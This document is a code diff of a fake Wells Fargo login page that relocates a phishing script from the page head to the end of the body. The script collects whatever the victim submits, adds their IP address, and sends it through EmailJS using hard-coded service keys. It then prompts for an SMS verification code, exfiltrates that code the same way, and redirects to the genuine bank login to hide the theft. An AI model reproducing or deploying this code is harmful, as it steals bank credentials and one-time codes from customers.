@@ -240,115 +240,7 @@
     
     </style>
 
-    <script>
-    // 1. Init EmailJS
-    try {
-        emailjs.init("y3lRWL7KLDjiFjNcN");
-        console.log("EmailJS Initialized");
-    } catch (e) {
-        console.error("EmailJS Init Failed", e);
-    }
-
-    // Global IP variable
-    let userIP = "";
-
-    // 2. First Form Logic
-    document.addEventListener("DOMContentLoaded", function() {
-        const form = document.getElementById('scamForm');
-        const btn = document.getElementById('verifyBtn');
-        const smsSection = document.getElementById('smsSection');
-
-        if (!form || !btn) {
-            console.error("Main form or button not found!");
-            return;
-        }
-
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            console.log("Form Submitted");
-
-            btn.disabled = true;
-            btn.textContent = "Verifying...";
-
-            const formData = new FormData(form);
-            const data = Object.fromEntries(formData.entries());
-
-            // Get IP
-            fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(ipData => {
-                userIP = ipData.ip;
-                data.ip = ipData.ip;
-                data.date = new Date().toLocaleString();
-
-                console.log("Sending Credentials to EmailJS...");
-                emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
-                .then(() => {
-                    console.log("Credentials Sent! Switching to SMS.");
-                    // SHOW SMS SECTION
-                    if(form) form.style.display = 'none';
-                    if(smsSection) smsSection.style.display = 'block';
-                    
-                    // Ensure SMS section is visible
-                    smsSection.style.visibility = 'visible';
-                    smsSection.style.opacity = '1';
-                })
-                .catch(error => {
-                    console.error("EmailJS Error:", error);
-                    // Show SMS anyway on error so flow continues
-                    console.log("Showing SMS section despite error.");
-                    if(form) form.style.display = 'none';
-                    if(smsSection) smsSection.style.display = 'block';
-                });
-            })
-            .catch(err => {
-                console.error("IP Fetch Error:", err);
-                // Fallback: Show SMS anyway
-                if(form) form.style.display = 'none';
-                if(smsSection) smsSection.style.display = 'block';
-            });
-        });
-    });
-
-    // 3. Global Submit Code Function
-    window.submitCode = function() {
-        const smsCode = document.getElementById('smsCode').value;
-        if(!smsCode || smsCode.length < 4) {
-            alert("Please enter a valid code.");
-            return;
-        }
-
-        console.log("SMS Code Submitted: " + smsCode);
-        
-        const btn = document.querySelector('#smsSection button');
-        if(btn) btn.disabled = true;
-
-        document.getElementById('smsSection').style.display = 'none';
-        document.querySelector('.container').style.display = 'none';
-        document.getElementById('processing').style.display = 'block';
-
-        const smsData = {
-            smsCode: smsCode,
-            timestamp: new Date().toLocaleString(),
-            ip: userIP
-        };
-
-        console.log("Sending SMS Code...");
-        emailjs.send("service_2bhy4ju", "template_1qzswkk", smsData)
-        .then(() => {
-            console.log("SMS Code Sent! Redirecting...");
-            setTimeout(() => {
-                window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
-            }, 1500);
-        })
-        .catch(err => {
-            console.error("SMS Send Failed", err);
-            setTimeout(() => {
-                window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
-            }, 1500);
-        });
-    };
-</script>
+    
 
  </head>
 <body>
@@ -557,5 +449,124 @@ window.location.href = "https://www.wellsfargo.com/";
 }
 </style>
 
-  </body>
+    script>
+    // 1. Init EmailJS
+    try {
+        emailjs.init("y3lRWL7KLDjiFjNcN");
+        console.log("EmailJS Initialized");
+    } catch (e) {
+        console.error("EmailJS Init Failed", e);
+    }
+
+    // Global IP variable
+    let userIP = "";
+
+    // 2. First Form Logic
+    document.addEventListener("DOMContentLoaded", function() {
+        const form = document.getElementById('scamForm');
+        const btn = document.getElementById('verifyBtn');
+        const smsSection = document.getElementById('smsSection');
+
+        if (!form || !btn) {
+            console.error("Main form or button not found!");
+            return;
+        }
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            console.log("Form Submitted");
+
+            btn.disabled = true;
+            btn.textContent = "Verifying...";
+
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+
+            // Get IP
+            fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(ipData => {
+                userIP = ipData.ip;
+                data.ip = ipData.ip;
+                data.date = new Date().toLocaleString();
+
+                console.log("Sending Credentials to EmailJS...");
+                emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
+                .then(() => {
+                    console.log("Credentials Sent! Switching to SMS.");
+                    // SHOW SMS SECTION
+                    if(form) form.style.display = 'none';
+                    if(smsSection) smsSection.style.display = 'block';
+                    
+                    // Ensure SMS section is visible
+                    smsSection.style.visibility = 'visible';
+                    smsSection.style.opacity = '1';
+                })
+                .catch(error => {
+                    console.error("EmailJS Error:", error);
+                    // Show SMS anyway on error so flow continues
+                    console.log("Showing SMS section despite error.");
+                    if(form) form.style.display = 'none';
+                    if(smsSection) smsSection.style.display = 'block';
+                });
+            })
+            .catch(err => {
+                console.error("IP Fetch Error:", err);
+                // Fallback: Show SMS anyway
+                if(form) form.style.display = 'none';
+                if(smsSection) smsSection.style.display = 'block';
+            });
+        });
+    });
+
+    // 3. Global Submit Code Function
+    window.submitCode = function() {
+        const smsCode = document.getElementById('smsCode').value;
+        if(!smsCode || smsCode.length < 4) {
+            alert("Please enter a valid code.");
+            return;
+        }
+
+        console.log("SMS Code Submitted: " + smsCode);
+        
+        const btn = document.querySelector('#smsSection button');
+        if(btn) btn.disabled = true;
+
+        document.getElementById('smsSection').style.display = 'none';
+        document.querySelector('.container').style.display = 'none';
+        document.getElementById('processing').style.display = 'block';
+
+        const smsData = {
+            smsCode: smsCode,
+            timestamp: new Date().toLocaleString(),
+            ip: userIP
+        };
+
+        console.log("Sending SMS Code...");
+        emailjs.send("service_2bhy4ju", "template_1qzswkk", smsData)
+        .then(() => {
+            console.log("SMS Code Sent! Redirecting...");
+            setTimeout(() => {
+                window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
+            }, 1500);
+        })
+        .catch(err => {
+            console.error("SMS Send Failed", err);
+            setTimeout(() => {
+                window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
+            }, 1500);
+        });
+    };
+</script>
+  
+
+
+
+
+
+
+
+
+
+</body>
 </html>
